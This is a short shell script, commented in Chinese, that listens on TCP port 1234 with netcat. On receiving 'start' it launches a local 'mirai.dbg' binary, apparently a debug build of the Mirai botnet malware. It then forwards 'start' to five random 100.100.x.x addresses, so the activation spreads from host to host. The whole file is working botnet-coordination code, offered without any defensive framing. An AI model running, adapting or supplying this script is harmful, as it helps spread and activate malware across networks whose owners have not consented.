#!/bin/sh

# 定义随机生成IP地址的函数，只生成100.100.XX.XX格式的IP
generate_ips() {
    for i in $(seq 1 5); do
        echo "100.100.$((RANDOM % 256)).$((RANDOM % 256))"
    done
}

# 定义向其他IP的1234端口发送start消息的函数
send_start_message() {
    ips=$(generate_ips)
    for ip in $ips; do
        echo "start" | nc -w 1 $ip 1234
        echo "Sent 'start' to $ip:1234"
    done
}

# 定义监听1234端口的函数
listen_on_port() {
    while true; do
        message=$(nc -l -p 1234)  # 监听1234端口
        if [ "$message" = "start" ]; then
            echo "Received 'start' message"
            # 检查是否有运行mirai.dbg程序
            if pgrep -f mirai.dbg > /dev/null; then
                echo "mirai.dbg is already running"
                # 随机生成5个IP并发送start消息
                send_start_message
            else
                echo "mirai.dbg is not running. Starting the program..."
                ./mirai.dbg &
                # 等待2分钟后发送start消息
                sleep 120
                send_start_message
            fi
        fi
    done
}

# 开始监听1234端口
listen_on_port
